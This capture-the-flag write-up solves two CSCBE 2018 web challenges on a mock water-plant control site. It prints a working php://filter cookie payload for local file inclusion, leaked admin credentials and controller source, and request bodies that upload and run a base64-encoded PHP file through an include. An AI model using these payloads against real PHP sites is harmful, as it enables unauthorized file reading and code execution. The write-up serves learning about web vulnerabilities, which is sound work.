# Water you talking about / Mad with power

### [~$ cd ..](../)

## Water you talking about ?
Two challenges were proposed on this website. The first one (water you talking about ?), was about the well-known PHP filter vulnerability. The statement
told us that one of the translations was lost, and we had to get it back.
![hydropump](https://github.com/BorelEnzo/Write-ups/blob/master/CSC_BE2018_Qualifiers/mad_with_power/hydropump.png)

We can see that we can choose the language, russian or english, and as we do it, a request is sent to http://34.253.114.152/index.php/main/lan/en or http://34.253.114.152/index.php/main/lan/ru.
However, if we prefer german and send a GET on http://34.253.114.152/index.php/main/lan/de, an error is raised:
> ```
> A PHP Error was encountered
> Severity: Warning
> Message: include(de.php): failed to open stream: No such file or directory
> Filename: html/language.php
> Line Number: 17
> Backtrace:
>  	File: /var/www/html/language.php
> 	Line: 17
>	Function: _error_handler
>	
>	File: /var/www/html/language.php
>	Line: 17
>	Function: include
>
>	File: /var/www/html/a14b9e5e14930e0da9630b541d00aba29/views/hero.php
>	Line: 12
>	Function: require_once
>	File: /var/www/html/a14b9e5e14930e0da9630b541d00aba29/controllers/Main.php
>	Line: 17
>	Function: view
>
>	File: /var/www/html/index.php
>	Line: 315
>	Function: require_once 
> ```
It's then pretty obvious that the website is vulnerable to local file inclusions. Nothing is put before our string, but the extension ".php" is added. However, we cannot send the payload in the URL as we did with "de",
but fortunately, our favorite language is put in our cookies. Then, we replay the request with the cookie:
> ```
>lang=php://filter/convert.base64-encode/resource=ru
> ```
As we expect, the server returns the content of the file ru.php encoded with base64:
> ```
>PD9waHAKJGZvb3RlciA9ICImY29weTsgU2VjdXJlIE9wZXJhdGlvbmFsIFN5c3RlbXMgKFNvUykgMjAxNyI7Cgokd2VsY29tZSA9ICLQlNC+0LHRgNC+INC/0L7QttCw0LvQvtCy0LDRgtGMINCyINC60L7QvdGC0YDQvtC70YzQvdGD0Y4g0L/QsNC90LXQu9GMINC00LvRjyDRg9GB0YLQsNC90L7QstC60LggSHlkcm9wdW1wIDIuMSwg0LrQvtGC0L7RgNCw0Y8g0L/QvtC30LLQvtC70Y/QtdGCINCy0LDQvCDQutC+0L3RgtGA0L7Qu9C40YDQvtCy0LDRgtGMINC4INC60L7QvdGE0LjQs9GD0YDQuNGA0L7QstCw0YLRjCDRgdC+0YHRgtC+0Y/QvdC40LUg0LDQutGC0LjQstC90L7QuSDRg9GB0YLQsNC90L7QstC60Lgg0LPQuNC00YDQvtC90LDRgdC+0YHQsC4g0JXRgdC70Lgg0YMg0LLQsNGBINC10YHRgtGMINC60LDQutC40LUt0LvQuNCx0L4g0LLQvtC/0YDQvtGB0YssINC+0LHRgNCw0YLQuNGC0LXRgdGMINCyINGB0LvRg9C20LHRgyDQv9C+0LTQtNC10YDQttC60Lgg0L/QviDRgtC10LvQtdGE0L7QvdGDICsxIDI5NCAyMzQgMDk4IjsKJHNpZ25pbmJ0biA9ICLQstC+0LnRgtC4INCyINGB0LjRgdGC0LXQvNGDIjsKJGFkbWlud2VsY29tZSA9ICLQlNC+0LHRgNC+INC/0L7QttCw0LvQvtCy0LDRgtGMINCyINCw0LTQvNC40L0t0L/QsNC90LXQu9GMLiDQn9C+0LbQsNC70YPQudGB0YLQsCwg0LLRi9Cx0LXRgNC40YLQtSDQstCw0Ygg0LLRi9Cx0L7RgCDQuNC3INCy0LDRgNC40LDQvdGC0L7QsiDQvdC40LbQtSI7CiRhZG1pbnZhbHZlID0gItCS0Ysg0LzQvtC20LXRgtC1INGD0L/RgNCw0LLQu9GP0YLRjCDQstGB0LXQvNC4INC60LvQsNC/0LDQvdCw0LzQuCDQvdC40LbQtS4g0J7QsdGA0LDRgtC40YLQtSDQstC90LjQvNCw0L3QuNC1LCDRh9GC0L4g0LrQu9Cw0L/QsNC9INC90LUg0LzQvtC20LXRgiDQsdGL0YLRjCDQvtGC0LrQu9GO0YfQtdC9LCDQtdGB0LvQuCDQtNCw0LLQu9C10L3QuNC1INGB0LvQuNGI0LrQvtC8INCy0LXQu9C40LrQvi4iOwokYWRtaW5zYWZldHkgPSAi0JLRgdC10LPQtNCwINC/0L7QvNC90LjRgtC1INC+INGB0L7QsdC70Y7QtNC10L3QuNC4INGC0LXRhdC90LjQutC4INCx0LXQt9C+0L/QsNGB0L3QvtGB0YLQuCEiOwokaW5zcGVjdCA9ICLQn9GA0L7QstC10YDQuNGC0YwiOwokaW5zcGVjdGxvbmcgPSAi0KPQsdC10LTQuNGC0LXRgdGMLCDRh9GC0L4g0LLRgdC1INCy0LDRiNC4INC30LDQs9GA0YPQttC10L3QvdGL0LUg0L/QsNGA0LDQvNC10YLRgNGLINC/0YDQsNCy0LjQu9GM0L3Riywg0LfQsNC/0YPRgdGC0LjQsiDQuNGFINCyINGB0L7QvtGC0LLQtdGC0YHRgtCy0YPRjtGJ0LXQuSDRgdGA0LXQtNC1INGC0LXRgdGC0LjRgNC+0LLQsNC90LjRjy4g0J/RgNC+0LHQu9C10LzRiyDRgSDQutC+0L3RhNC40LPRg9GA0LDRhtC40LXQuSAtINGN0YLQviDQv9GA0L7QsdC70LXQvNCwINC90L7QvNC10YAg0L7QtNC40L0g0YEg0YDQsNC30LLQtdGA0YLRi9Cy0LDQvdC40Y/QvNC4INC4INC90LUg0L/QvtC60YDRi9Cy0LDRjtGC0YHRjyDQstCw0YjQuNC8INGB0L7Qs9C70LDRiNC10L3QuNC10Lwg0L7QsSDQvtCx0YHQu9GD0LbQuNCy0LDQvdC40LguIjsKJHN1Ym1pdCA9ICLQntGC0L/RgNCw0LLQuNGC0YwiOwokc3VibWl0bG9uZyA9ICLQntGC0L/RgNCw0LLRjNGC0LUg0YHQstC+0Lgg0L3QsNGB0YLRgNC+0LnQutC4INC90LAg0LHRjdC60Y3QvdC0LiDQntCx0YDQsNGC0LjRgtC1INCy0L3QuNC80LDQvdC40LUsINGH0YLQviDQtNC+INC90L7QstGL0YUg0L3QsNGB0YLRgNC+0LXQuiDQvNC+0LbQtdGCINC/0YDQvtC50YLQuCDQtNC+INGC0YDQtdGFINGG0LjQutC70L7Qsi4g0JXRgdC70Lgg0L3QuNC60LDQutC40YUg0LjQt9C80LXQvdC10L3QuNC5INC90LUg0L/RgNC+0LjQt9C+0YjQu9C+LCDQvtCx0YDQsNGC0LjRgtC10YHRjCDQsiDRgdC70YPQttCx0YMg0L/QvtC00LTQtdGA0LbQutC4LiI7CiR2YWxpZGF0ZSA9ICLQn9GA0L7QstC10YDQuNGC0YwiOwokdmFsaWRhdGVsb25nID0gItCf0L7RgdC70LUg0L7RgtC/0YDQsNCy0LrQuCDRg9Cx0LXQtNC40YLQtdGB0YwsINGH0YLQviDQstCw0YjQuCDQvdCw0YHRgtGA0L7QudC60Lgg0LjQvNC10Y7RgiDQttC10LvQsNC10LzRi9C5INGN0YTRhNC10LrRgi4g0JXRgdC70Lgg0YfRgtC+LdGC0L4g0L3QtSDRgtCw0LosINCy0LXRgNC90LjRgtC10YHRjCDQuiDQv9GA0LXQtNGL0LTRg9GJ0LXQuSDQutC+0L3RhNC40LPRg9GA0LDRhtC40Lgg0LrQsNC6INC80L7QttC90L4g0YHQutC+0YDQtdC1LiI7CgokaGlzdG9yeXRpdGxlID0gItCd0LjQttC1INC/0LXRgNC10YfQuNGB0LvQtdC90Ysg0LLRgdC1INGE0LDQudC70YssINC60L7RgtC+0YDRi9C1INCx0YvQu9C4INC30LDQs9GA0YPQttC10L3RiyDQsiDQv9GA0L7RiNC70L7QvC4g0J7QsdGA0LDRgtC40YLQtSDQstC90LjQvNCw0L3QuNC1LCDRh9GC0L4g0L7QvdC4INC+0YfQuNGJ0LDRjtGC0YHRjyDQutCw0LbQtNGL0LUgMTAg0LzQuNC90YPRgiwg0YfRgtC+0LHRiyDRgdC40YHRgtC10LzQsCDQvdC1INGB0YLQsNC90L7QstC40LvQsNGB0Ywg0YfQuNGB0YLQvtC5INC4INGH0LjRgdGC0L7QuS4iOwoKJGVudGVyY29uZmlnID0gItCf0L7QttCw0LvRg9C50YHRgtCwLCDQstCy0LXQtNC40YLQtSDQvdC+0LLRi9C1INC60L7QvdGE0LjQs9GD0YDQsNGG0LjQvtC90L3Ri9C1INGE0LDQudC70YsuIjsKCiRidG51cGRhdGUgPSAi0J7QsdC90L7QstC40YLRjCDQutC+0L3RhNC40LPRg9GA0LDRhtC40Y4iOwokYnRudmlldyA9ICLQn9GA0L7RgdC80L7RgtGAINC40YHRgtC+0YDQuNC4INC60L7QvdGE0LjQs9GD0YDQsNGG0LjQuCI7CiRidG5jb250cm9sID0gItCj0L/RgNCw0LLQu9C10L3QuNC1INC60LvQsNC/0LDQvdC+0LwiOwokc3RhdGV0aXRsZSA9ICLQotC10LrRg9GJ0LjQuSDRgNCw0LHQvtGH0LjQuSDRgdGC0LDRgtGD0YEuINCU0LvRjyDQstC90LXRgdC10L3QuNGPINC40LfQvNC10L3QtdC90LjQuSDQvdC10L7QsdGF0L7QtNC40LzQviDQv9GA0L7QudGC0Lgg0LDRg9GC0LXQvdGC0LjRhNC40LrQsNGG0LjRji4iOwoKCiRmbGFnID0gIkNTQ0JFe0xGSV90aHJvdWdoX0JBU0U2NF9GVFd9IjsKCj8+Cg==
> ```
We decode it, and find at the end: `$flag = "CSCBE{LFI_through_BASE64_FTW}`

## Mad with power
The first part was pretty straightforward, but the second one is more difficult. The goal is then to get the mail of the admin.
The first thing to do is to sign in as the developer, who has admin privileges. To do this, we sent random credentials and hit the sign hit button, and we intercepted the response with Burp.
In the body, we found the Lucas' credentials: `<!-- DEV: lucas:devpwd -->`
![admin](https://github.com/BorelEnzo/Write-ups/blob/master/CSC_BE2018_Qualifiers/mad_with_power/admin_panel.png)
The admin panel contains three links:
* index.php/admin/update
* index.php/admin/view_conf
* index.php/admin/valve_control
### Upload a file
The third one is not relevant for the attack. Indeed, in the "update" page, we can upload some files, and "view_conf" will give us the ability to access our uploaded files.
However, we had first to download source code in order to know how our files would be stored on the server. Thanks to backtrace, we knew where are the controllers, and we can exploit the LFI once again to download
the "admin" controller ( `lang=php://filter/convert.base64-encode/resource=a14b9e5e14930e0da9630b541d00aba29/controllers/Admin` ):
> ```PHP
><?php
>defined('BASEPATH') OR exit('No direct script access allowed');
>
>class Admin extends CI_Controller {
>
>    public function index(){
>        $this->load->view('admin_view');
>    }
>
>    public function __construct(){
>        parent::__construct();
>        $this->load->library('session');
>        $this->load->helper('cookie');
>        if(!$this->session->userdata("admin")){
>            header("Location: " . base_url());
>        }
>    }
>        
>    public function view_conf(){
>        $basedir = "/var/www/html/firmware_updates/";
>        $dirs = array_filter(glob($basedir . "*", GLOB_ONLYDIR));
>        for($i = 0; $i<sizeof($dirs); $i++){
>            $dir = $dirs[$i];
>            $numfiles = sizeof(glob($dir . "/*"));
>            $dirs[$i] = ["timestamp" => substr($dirs[$i], strlen($basedir)), "numfiles" => $numfiles];
>        }
>        $data = array();
>        $data["updates"] = $dirs;
>        $this->load->view("admin_history", $data);
>    }
>    
>    public function valve_control(){    
>        $data = [];
>        $data["valves"] = $this->getRandomData();
>        $this->load->view("admin_control", $data);
>    }
>
>    public function control_api(){
>        if(rand(1, 10) > 5){
>            $this->output->set_output("ERROR");
>        }
>        $this->output->set_output("OK");
>    }
>
>    public function update(){
>        $this->load->view("admin_upload");
>    }
>
>    public function getRandomData(){
>        $data = array();
>        for($i = 0; $i<27; $i++){
>            $data[$i] = array("name"=>"Valve " . $i, "pressure"=> rand(48, 100), "state"=>(rand(0, 1) == 1 ? "OPEN" : "CLOSE"));
>        }
>        return $data;
>    }
>
>    public function update_api(){
>        $date =  date('Ymdhis');
>        $basedir = "/var/www/html/firmware_updates";
>        $path = $basedir . "/" . $date . "/";
>        mkdir($path);
>        copy("/var/www/html/templates/.htaccess", $path . ".htaccess");
>        copy("/var/www/html/templates/de327aae87a9ebf5fc02df56c768057d.php", $path . "de327aae87a9ebf5fc02df56c768057d.php");
>        $jsonArray = json_decode(file_get_contents('php://input'),true); 
>        if($this->session->userdata("admin")){
>            if(sizeof($jsonArray) > 6){
>                $this->output->set_output("Too many files");
>                return;
>            }
>            foreach($jsonArray as $key=>$value){
>                $type = "bin";
>                $targetName = $path . "." . $key ;
>                if(!file_exists($targetName)){
>                    $rp = $this->security->sanitize_filename($targetName, TRUE);
>                    if(substr($rp, 0, strlen($basedir)) === $basedir){
>                        if(strlen($value) > 2000){
>                            $this->output->set_output( "{'status': 'Size too large. No more room on ".$rp."'}");
>                            return;
>                        }
>                        $decoded = base64_decode($value);
>                        if($decoded !== false && $value != "0"){
>                            file_put_contents($rp, $decoded);
>                        }
>                        else{
>                            $this->output->set_output( "{'status': 'Something went wrong'}");
>                        }
>                    }
>                    else{
>                        $this->output->set_output( "{'status': 'Access denied'}");
>                        return;
>                    }
>                }
>            }
>            $this->output->set_output("{'status':'ok'}");
>        }
>        else{
>            $this->output->set_output( "{'status': 'Admin only...'}");
>        }
>    }
>}
> ```
The most interesting routine here is `update_api`, which writes our files in ephemeral folders. Let's try to upload a file to see how it works.
We began with a file containing only a call to `phpinfo`. However, a client-side script crafts a payload with our file and doesn't upload it as it is.
We saw that the body of the POST request sent to the server was:
> ```
> ["base64,PD9waHAKcGhwaW5mbygpOwo/Pgo=",0,0,0,0,0]
> ```
We can upload 6 files at the same time, that the reason why it looks like an array. The Base64-encoded string is the content of our PHP file, which would be decoded and written in a file on the server if all goes well.
Let's analyze the routine:
* a new ephemeral directory is created in /var/www/html/firmware_updates, with a .htaccess and de327aae87a9ebf5fc02df56c768057d.php
* `$jsonArray = json_decode(file_get_contents('php://input'),true);` Since we send an array, the variable `$jsonArray` looks like this:
> ```PHP
> array (size=6)
>  0 => string 'base64,PD9waHAKcGhwaW5mbygpOwo/Pgo=' (length=35)
>  1 => int 0
>  2 => int 0
>  3 => int 0
>  4 => int 0
>  5 => int 0
> ```
* `$targetName = $path . "." . $key` will be the name of our uploaded file, '/var/www/html/????/.0' in this case.
* if the file is too large, an error is returned, otherwise the string we sent is decoded and written into the file.
To upload a PHP script, we should therefore send someting like this:
> ```
> {"index.php":"PD9waHAKcGhwaW5mbygpOwo/Pgo="}
> ```
The file will be renamed ".index.php", but it doesn't matter, and the code will written inside.

To get the mail of the admin, we tried to read config files, and execute systems commands, but actually the solution was way more simple: we only had to print the
meta-variable $_SERVER.
> ```python
> >>> base64.b64encode("<?php\nvar_dump($_SERVER);\n?>")
> 'PD9waHAKdmFyX2R1bXAoJF9TRVJWRVIpOwo/Pg=='
> ```
We then replay the request with:
> ```
> {"index.php":"PD9waHAKdmFyX2R1bXAoJF9TRVJWRVIpOwo/Pg=="}
> ```
We received a code 200, and knew that it was okay.

### Execute the code
Actually, we didn't exploit it in a row, because we had to download the appropriate source files, and send the right payload. We present here the most straightforward way to get the flag.
To know where the file was located, we took a look at the page "view_conf" will all timestamps (20180311035118 here). Then we tried to reach 
http://34.253.114.152/firmware_updates/20180311035118/ and got the following error:
> ```
> Warning: include(): Filename cannot be empty in /var/www/html/firmware_updates/20180311035118/de327aae87a9ebf5fc02df56c768057d.php on line 8
> Warning: include(): Failed opening '' for inclusion (include_path='.:/usr/share/php') in /var/www/html/firmware_updates/20180311035118/de327aae87a9ebf5fc02df56c768057d.php on line 8
> ```
We then retried by specifying a full path: http://34.253.114.152/firmware_updates/20180311035118/de327aae87a9ebf5fc02df56c768057d.php
> ```
> Notice: Undefined index: url in /var/www/html/firmware_updates/20180311035118/de327aae87a9ebf5fc02df56c768057d.php on line 8
> Warning: include(): Filename cannot be empty in /var/www/html/firmware_updates/20180311035118/de327aae87a9ebf5fc02df56c768057d.php on line 8
> Warning: include(): Failed opening '' for inclusion (include_path='.:/usr/share/php') in /var/www/html/firmware_updates/20180311035118/de327aae87a9ebf5fc02df56c768057d.php on line 8
> ```
The script expects a parameter (a file to include), so we tried to include our script: http://34.253.114.152/firmware_updates/20180311035118/de327aae87a9ebf5fc02df56c768057d.php?url=.index.php, and finally, it was a win!
> ```PHP
> array(32) {
>	...
>	["SERVER_ADMIN"]=> string(35) "CSCBE{superEngineer@powerplant.com}"
>	...
>}
> ```
